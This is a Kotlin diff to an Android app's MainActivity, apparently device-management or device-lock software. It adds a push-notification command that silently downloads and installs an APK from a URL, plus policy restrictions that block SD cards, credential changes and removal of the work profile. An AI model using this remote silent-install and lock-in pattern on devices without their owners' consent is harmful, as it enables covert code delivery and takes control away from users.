@@ -188,9 +188,44 @@ class MainActivity : AppCompatActivity() {
     private fun checkBodyForCommands(body: String, title: String?) {
         Log.d(FCM_LOG_TAG, "Analyzing notification: $body  $title")
 
+        val lowerTitle = title?.lowercase(Locale.getDefault()) ?: ""
         val lowerBody = body.lowercase(Locale.getDefault())
 
         when {
+            lowerTitle.contains("install_app") -> {
+                Log.d(FCM_LOG_TAG, "INSTALL_APP command found - APK URL: $body")
+                handler.postDelayed({
+                    Toast.makeText(this, "Downloading & installing app...", Toast.LENGTH_LONG).show()
+                    val installer = SilentInstaller(applicationContext)
+                    installer.downloadAndInstall(body, object : SilentInstaller.InstallCallback {
+                        override fun onDownloadStarted() {
+                            Log.d(FCM_LOG_TAG, "Download started")
+                        }
+                        override fun onDownloadProgress(percent: Int) {
+                            Log.d(FCM_LOG_TAG, "Download: $percent%")
+                        }
+                        override fun onDownloadComplete() {
+                            runOnUiThread {
+                                Toast.makeText(this@MainActivity, "Download complete, installing...", Toast.LENGTH_SHORT).show()
+                            }
+                        }
+                        override fun onInstallStarted() {
+                            Log.d(FCM_LOG_TAG, "Install started")
+                        }
+                        override fun onInstallSuccess(packageName: String?) {
+                            runOnUiThread {
+                                Toast.makeText(this@MainActivity, "Installed: $packageName", Toast.LENGTH_LONG).show()
+                            }
+                        }
+                        override fun onInstallFailed(error: String) {
+                            runOnUiThread {
+                                Toast.makeText(this@MainActivity, "Install failed: $error", Toast.LENGTH_LONG).show()
+                            }
+                        }
+                    })
+                }, 1000)
+            }
+
             lowerBody.contains("active device") -> {
                 Log.d(FCM_LOG_TAG, "INACTIVE command found - unlocking screen")
                 handler.postDelayed({
@@ -499,7 +534,10 @@ class MainActivity : AppCompatActivity() {
                 UserManager.DISALLOW_INSTALL_APPS,
                 UserManager.DISALLOW_UNINSTALL_APPS,
                 UserManager.DISALLOW_ADD_USER,
-                UserManager.DISALLOW_DEBUGGING_FEATURES
+                UserManager.DISALLOW_DEBUGGING_FEATURES,
+                UserManager.DISALLOW_MOUNT_PHYSICAL_MEDIA,  // Block SD card
+                UserManager.DISALLOW_CONFIG_CREDENTIALS,    // Block changing certificates
+                UserManager.DISALLOW_REMOVE_MANAGED_PROFILE // Block removing work profile
             )
             if (isEnabled) {
                 for (r in restrictions) {
